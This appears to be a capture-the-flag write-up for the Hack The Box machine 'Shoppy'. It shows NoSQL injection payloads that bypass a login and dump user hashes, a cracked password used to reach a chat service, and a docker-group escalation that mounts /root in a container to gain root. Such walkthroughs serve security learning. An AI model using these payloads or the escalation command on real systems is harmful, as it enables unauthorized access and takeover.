#### Initial Foothold 
- upon visiting `shoppy.htb/admin` it redirects us to `/login`
- we can attempt SQLi on the login using payload `admin' || '' === '`
![[Shoppy admin.png]]
- there's functionality that searches users, we can attempt to perform SQLi on the user input using `'; return '' == '` payload
![[SQLi dump.png]]
- we can decrpt the hash using: https://hashes.com/en/tools/hash_identifier
- we get `6ebcea65320589ca4f2f1ce039975995:remembermethisway`
- we can use this `josh:remembermethisway` to login to `mattermost.shoppy.htb`

#### Privilege Escalation
- run `id` as `deploy`
```
$ id
uid=1001(deploy) gid=1001(deploy) groups=1001(deploy),998(docker)
```
- user `deploy` is in `docker` group which means we can interact with `docker` containers 
```
$ docker images
REPOSITORY   TAG       IMAGE ID       CREATED       SIZE
alpine       latest    d7d3d98c851f   3 years ago   5.53MB

```
- search for `docker group privilege escalation`, and found article: https://www.hackingarticles.in/docker-privilege-escalation/
- the gist of this vulnerability is that the `docker` group gives the same permission as root without need a password when interactive with docker 
```
$ docker run -it -v /root:/mnt alpine
/ # whoami
root
/ # cd /mnt
/mnt # ls
root.txt
```
